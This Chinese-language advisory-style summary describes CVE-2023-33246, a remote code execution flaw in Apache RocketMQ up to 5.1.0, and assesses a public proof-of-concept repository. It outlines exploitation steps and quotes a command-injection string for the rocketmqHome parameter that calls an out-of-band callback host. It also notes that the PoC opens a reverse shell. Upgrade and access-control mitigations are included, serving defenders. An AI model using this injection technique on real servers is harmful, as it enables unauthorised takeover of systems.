## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)